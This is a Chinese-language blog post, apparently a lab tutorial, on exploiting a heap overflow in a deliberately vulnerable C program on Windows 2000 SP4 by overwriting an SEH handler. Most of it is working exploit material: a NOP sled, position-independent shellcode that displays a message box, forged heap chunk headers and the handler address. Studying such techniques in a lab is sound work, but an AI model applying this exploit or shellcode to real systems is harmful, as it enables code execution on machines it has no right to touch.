---
layout:		post
title:		在堆溢出中利用S.E.H
author:		wooy0ung
tags:		windows
category:  	exploit
---


>[分析环境]  
>系统: Windows 2000 Professional sp4  
>编译器: Visual C++ 6.0  
>调试器: OllyDbg 1.10  
<!-- more -->


### 0x00 前期准备

VC 6.0新建一个工程, 贴入以下代码, 选择release版本

```
#include <windows.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90";		# 200 byte

DWORD MyExceptionhandler()
{
	ExitProcess(1);
	return 0;
}

int main()
{
	HLOCAL h1=0,h2=0;
	HANDLE hp;
	hp=HeapCreate(0,0x1000,0x10000);
	h1=HeapAlloc(hp,HEAP_ZERO_MEMORY,200);
	memcpy(h1,shellcode,200);	# 为了观察分配的块首信息, 先不溢出

	__asm int 3;
	__try
	{
		h2=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
	}
	__except(MyExceptionhandler()){}

	return 0;
}
```


### 0x01 exploit

运行*.exe, 弹出异常框, 选择取消自动调用OllyDbg附加调试, 成功断下

![](/assets/img/exploit/2017-10-01-windows-2000-heapseh/0x00.png)

内存区goto 0x00360688, 定位到h1以及尾块的块首

![](/assets/img/exploit/2017-10-01-windows-2000-heapseh/0x01.png)
![](/assets/img/exploit/2017-10-01-windows-2000-heapseh/0x02.png)

这里有问题的可以看另一篇文:

#### 传送门: [DWORD SHOOT堆溢出利用](http://www.wooy0ung.me/exploit/2017/10/01/windows-2000-dwordshoot/)

构造junk+shellcode填充200 byte的数据区

```
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90"
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7"
"\x16\x01\x1a\x00\x00\x10\x00\x00"		# 按尾块的首部填充
"\x88\x06\x36\x00"			# shellcode起始
"\x90\x90\x90\x90"			# 暂时填充无效数据, 调试确定
```

将memcpy长度改为0x200, 确认没有忽略任何异常后, 附加调试

![](/assets/img/exploit/2017-10-01-windows-2000-heapseh/0x03.png)

F9直接运行, 调试器捕捉到异常

![](/assets/img/exploit/2017-10-01-windows-2000-heapseh/0x04.png)

查看S.E.H chain, 定位到最近的S.E.H结构

![](/assets/img/exploit/2017-10-01-windows-2000-heapseh/0x05.png)

这样就得到了需要覆写SE handler的地址0x0012FF30, 将最后的"\x90\x90\x90\x90"修改成"\x30\xff\x12\x00"

![](/assets/img/exploit/2017-10-01-windows-2000-heapseh/0x06.png)

注释掉int 3指令, 直接运行, pwn~

![](/assets/img/exploit/2017-10-01-windows-2000-heapseh/0x07.png)